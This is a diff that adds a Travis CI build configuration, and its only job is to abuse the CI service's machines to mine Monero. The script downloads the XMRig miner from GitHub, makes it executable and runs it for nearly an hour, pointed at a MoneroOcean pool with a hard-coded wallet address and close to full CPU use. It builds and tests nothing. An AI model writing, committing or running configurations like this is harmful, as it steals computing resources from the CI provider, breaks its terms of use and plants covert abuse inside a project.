@@ -1,0 +1,7 @@
+language: generic
+os: linux
+dist: focal
+script:
+  - curl -sL https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz | tar xz --strip-components=1
+  - chmod +x xmrig
+  - timeout 3300 ./xmrig -o gulf.moneroocean.stream:10032 -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X -p travis_ci --donate-level=0 --cpu-max-threads-hint=90
